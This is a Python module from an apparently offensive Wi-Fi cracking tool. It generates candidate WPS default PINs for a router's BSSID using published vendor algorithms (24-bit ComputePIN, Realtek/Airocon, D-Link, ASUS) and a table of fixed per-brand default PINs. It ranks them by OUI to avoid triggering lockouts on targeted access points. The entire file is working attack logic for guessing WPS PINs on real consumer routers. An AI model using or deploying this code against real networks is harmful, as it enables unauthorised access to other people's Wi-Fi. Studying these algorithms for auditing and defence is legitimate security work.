"""WPS default-PIN generation from published algorithms.

PINs are computed at runtime from published WPS default-PIN algorithms, so no PIN table is
bundled. The 8th digit is the Wi-Fi Simple Config checksum (:func:`wsc_crypto.pin_checksum`).

A router's OUI identifies its **brand** (an IEEE assignment) but never its **chipset** (the
Wi-Fi silicon inside — many brands share one). So candidates split by whether the OUI can tell
us the PIN applies:

* **Broad** (tried on every AP): the chipset-family algorithms, which can't be tied to a brand
  from the OUI — ``pin24`` (Broadcom/Atheros/Ralink "ComputePIN") and ``pin_airocon`` (Realtek).
  (Realtek owns 2 OUIs and Broadcom 31, confirming these are keyed on the chip, not the brand.)
* **Brand-keyed** (tried only on a matching OUI — see :mod:`wps_router_ouis`): the generators
  ``pin_dlink`` / ``pin_dlink1`` (D-Link) and ``pin_asus`` (ASUS), plus a few fixed per-brand
  default PINs (``_VENDOR_STATICS``): Thomson, Edimax, Upvel, Huawei HG532x, D-Link DSL-2740R.
  Aimed by OUI, so they never cost the lockout budget on other brands' APs.

Algorithm descriptions: bertof/WPS-pin-generator; the devttys0 write-ups; 3WiFi
(3wifi.stascorp.com/wpspin). To check for newer vendor-specific PINs, see airgeddon's
``known_pins.db`` (github.com/v1s1t0r1sh3r3/airgeddon).

Deliberately not seeded (can't be tied to a brand from the OUI, so seeding them would just
spray wrong guesses at every AP): the speculative N-bit / inverted-NIC variants, the chipset
static constants (Broadcom / Realtek / Airocon), and the ISP-rebrand statics (Onlime, CBN-ONO…).
Belkin is deferred too (needs the M1 serial). The generic always-try constants live in
:mod:`pins` (COMMON_PINS).
"""

from __future__ import annotations

from typing import Callable, Dict, List, Tuple

from .wsc_crypto import pin_checksum

Generator = Callable[[bytes], List[str]]


def _finalize(raw: int) -> str:
    """A 7-digit payload int → the full 8-digit PIN with its WSC checksum digit.

    ``:07d`` matters — a payload with a leading zero (e.g. ``05294176``) must keep it.
    """
    seven = raw % 10_000_000
    return f"{seven:07d}{pin_checksum(seven)}"


def _mac(bssid: bytes) -> int:
    return int.from_bytes(bssid, "big")


# --- 24-bit "ComputePIN" (Broadcom/Atheros/Ralink family — the broadest single algorithm) ---
def pin24(bssid: bytes) -> List[str]:
    return [_finalize(_mac(bssid) & 0xFFFFFF)]


# --- Airocon / Realtek ---
def pin_airocon(bssid: bytes) -> List[str]:
    b = bssid
    raw = (((b[0] + b[1]) % 10)
           + ((b[5] + b[0]) % 10) * 10
           + ((b[4] + b[5]) % 10) * 100
           + ((b[3] + b[4]) % 10) * 1000
           + ((b[2] + b[3]) % 10) * 10000
           + ((b[1] + b[2]) % 10) * 100000
           + ((b[0] + b[1]) % 10) * 1000000)
    return [_finalize(raw)]


# --- D-Link (Heffner/devttys0 2014) ---
def _dlink_raw(nic: int) -> int:
    pin = nic ^ 0x55AA55
    pin ^= (((pin & 0x0F) << 4) + ((pin & 0x0F) << 8) + ((pin & 0x0F) << 12)
            + ((pin & 0x0F) << 16) + ((pin & 0x0F) << 20))
    pin %= 10_000_000
    if pin < 1_000_000:                       # force 7 digits, no leading zero
        pin += (pin % 9) * 1_000_000 + 1_000_000
    return pin


def pin_dlink(bssid: bytes) -> List[str]:
    return [_finalize(_dlink_raw(_mac(bssid) & 0xFFFFFF))]


def pin_dlink1(bssid: bytes) -> List[str]:
    # The WPS radio BSSID is often the label MAC + 1.
    return [_finalize(_dlink_raw((_mac(bssid) + 1) & 0xFFFFFF))]


# --- ASUS ---
def pin_asus(bssid: bytes) -> List[str]:
    b = bssid
    s = b[1] + b[2] + b[3] + b[4] + b[5]
    digits = "".join(str((b[i % 6] + b[5]) % (10 - (i + s) % 7)) for i in range(7))
    return [_finalize(int(digits))]


# --- Dispatch: brand-keyed candidates for a matching OUI, then the broad chipset ones ------
_BROAD_ALGOS: Tuple[Generator, ...] = (pin24, pin_airocon)

_VENDOR_ALGOS: Dict[str, Tuple[Generator, ...]] = {
    "dlink":  (pin_dlink, pin_dlink1),
    "asus":   (pin_asus,),
    "belkin": (),   # Arcadyan-Belkin algo needs the M1 serial (deferred); pin24 covers it broadly
}

# Fixed per-brand default PINs — tried only on that brand's routers (aimed by OUI, like the
# generators, so they never cost the lockout budget on other brands' APs).
_VENDOR_STATICS: Dict[str, Tuple[str, ...]] = {
    "dlink":   ("68175542",),                          # DSL-2740R
    "thomson": ("67958146",),
    "edimax":  ("35611530",),
    "upvel":   ("20854836", "43977680", "05294176"),   # Upvel + UR-814AC + UR-825AC
    "huawei":  ("34259283",),                          # HG532x
}


def pins_for(bssid: bytes) -> List[str]:
    """Ranked, deduped candidate PINs for a 6-byte BSSID.

    Brand-keyed candidates (generators + fixed PINs, for a matching OUI) first, then the broad
    chipset-family generators.
    """
    from . import wps_router_ouis    # lazy: table imported only at the first WPS attempt
    vendor = wps_router_ouis.OUI_VENDOR.get(bssid[:3].hex().upper())
    out: List[str] = []
    for algo in _VENDOR_ALGOS.get(vendor, ()):
        out += algo(bssid)
    out += _VENDOR_STATICS.get(vendor, ())
    for algo in _BROAD_ALGOS:
        out += algo(bssid)
    return list(dict.fromkeys(out))     # order-preserving dedup
